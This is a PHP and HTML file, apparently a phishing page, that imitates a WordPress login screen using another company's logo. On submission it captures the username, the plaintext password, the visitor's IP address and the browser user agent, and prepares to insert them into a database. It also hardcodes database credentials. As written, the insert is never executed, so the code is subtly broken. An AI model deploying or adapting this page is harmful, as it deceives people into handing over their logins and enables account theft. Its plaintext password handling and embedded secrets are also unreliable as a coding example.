<?php
session_start();

$host = "db"; // Docker Compose'da MySQL servisinin adı
$username = "database";
$password = "Erenemir1comehacker";
$dbname = "database_ae5234"; // Docker Compose dosyasında belirttiğiniz veritabanı adı

// Veritabanı bağlantısı
$conn = new mysqli($host, $username, $password, $dbname);

// Bağlantı kontrolü
if ($conn->connect_error) {
    die("Bağlantı hatası: " . $conn->connect_error);
}

// Form gönderildiğinde çalışacak kod
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $kullaniciAdi = $_POST["username"];
    $sifre = $_POST["password"]; // Parolayı düz metin olarak alıyoruz
    $ipAdresi = $_SERVER["REMOTE_ADDR"];
    $cihazBilgisi = $_SERVER["HTTP_USER_AGENT"];

    // Veritabanına kullanıcı bilgilerini kaydetme
    $sql = "INSERT INTO users (username, password, ip_address, device_info) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ssss", $kullaniciAdi, $sifre, $ipAdresi, $cihazBilgisi);

    $stmt->close();
}

$conn->close();
?>


<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Giriş Sayfası</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
        }

        .login {
            width: 320px;
            margin: 0 auto;
            background: #fff;
            border-radius: 8px;
            padding: 30px 30px 20px 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .login-logo {
            background-image: url('https://fahika.com/wp-content/uploads/2020/04/logo-fahika-white.png');
            background-size: contain;
            width: 100%;
            height: 60px;
            margin-bottom: 20px;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .form-submit {
            background-color: #0062cc;
            border: 1px solid #005cbf;
            color: #fff;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        .form-submit:hover {
            background-color: #005cbf;
        }

        .form-submit:focus {
            outline: none;
        }

        .links {
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            text-decoration: none;
            color: #0073aa;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="login">
        <div class="login-logo"></div>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <input type="text" id="username" name="username" class="form-input"
                placeholder="Kullanıcı Adı veya E-posta Adresi" required>
            <input type="password" id="password" name="password" class="form-input" placeholder="Parola" required>
            <button type="submit" class="form-submit">Giriş Yap</button>
        </form>
        <div class="links">
            <a href="lostpassword.php">Parolanızı mı unuttunuz?</a> |
            <a href="register.php">Kayıt Ol</a>
        </div>
    </div>
</body>

</html>